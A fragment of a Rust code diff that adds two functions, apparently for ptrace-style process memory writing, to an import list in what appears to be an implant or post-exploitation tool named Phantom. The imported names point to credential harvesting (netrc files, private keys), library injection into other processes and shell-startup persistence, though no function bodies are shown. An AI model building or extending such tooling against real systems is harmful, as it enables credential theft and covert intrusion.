@@ -28,7 +28,7 @@ use super::{
     collect_netrc, encode_bytes, encode_harvest_entries, encode_u32, execute, find_libc_base,
     is_private_key_bytes, parse_group_entries, parse_logged_on_sessions, parse_logged_on_users,
     parse_memory_region, parse_user_entries, read_from_proc_mem, remove_shell_rc_block,
-    resolve_dlopen_in_target,
+    resolve_dlopen_in_target, wait_for_sigtrap, write_to_proc_mem,
 };
 use crate::config::PhantomConfig;
 use crate::error::PhantomError;
